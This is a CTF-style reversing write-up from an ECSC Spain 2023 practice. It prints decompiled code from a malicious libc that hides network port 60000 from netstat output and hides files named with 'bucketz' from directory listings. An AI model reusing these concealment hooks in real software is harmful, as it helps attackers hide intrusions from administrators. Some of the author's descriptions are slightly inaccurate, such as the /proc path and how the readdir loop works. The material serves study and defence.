---
title: "Reversing Practice3 ECSCSpain23"
date: 2023-09-01T23:21:07+02:00
author: l0w3
---

## Reversing Challenge Forensics Challenge ECSC Team Spain 2023 - Third Practice

In this challenge we were given a `libc` file that was modified to be malicious and we had to determine which was its behaviour.

### Which port is hidden on the netstat output?

The following snippet of code shows the relevant part to answer that question:

```c
FILE * falsify_tcp(undefined8 param_1,undefined8 param_2,code *param_3 )
{
  FILE *__stream;
  FILE *__stream_00;
  char *pcVar1;
  long in_FS_OFFSET;
  char local_d8 [200];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = (FILE *)(*param_3)(param_1,param_2);
  __stream_00 = tmpfile();
  while( true ) {
    pcVar1 = fgets(local_d8,200,__stream);
    if (pcVar1 == (char *)0x0) break;
    pcVar1 = strstr(local_d8,":EA60");
    if (pcVar1 == (char *)0x0) {
      fputs(local_d8,__stream_00);
    }
  }
  fclose(__stream);
  rewind(__stream_00);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return __stream_00;
}
```

What the program does is:

1. Read the /proc/tcp/net file (since this function is only called by `fopen`)
2. Get the data from this file and look for the string `:EA60`
3. If the string is present, it redirects the output to the tmpfile that is deleted when the streamfile is closed.

Thus, we see it's trying to hide the net info if this port is open

`flag: 60000`

### Which files are being hidden?

In this case, we are going to look at the `readdir()` function

```c
dirent * readdir(DIR *__dirp)

{
  char *pcVar1;
  dirent *pdVar2;
  
  o_readdir = (code *)dlsym(0xffffffffffffffff,"readdir");
  do {
    pdVar2 = (dirent *)(*o_readdir)(__dirp);
    if (pdVar2 == (dirent *)0x0) {
      return (dirent *)0x0;
    }
    pcVar1 = strstr(pdVar2->d_name,"bucketz");
  } while (pcVar1 != (char *)0x0);
  return pdVar2;
}
```

We see that in this case, it reads the content of the directory given and it will keep showing them until the directory contains the string `bucketz`.

Thus, we can assume that it tries to hide the files that contain this string

`flag: It hides all files with the string bucketz on its name`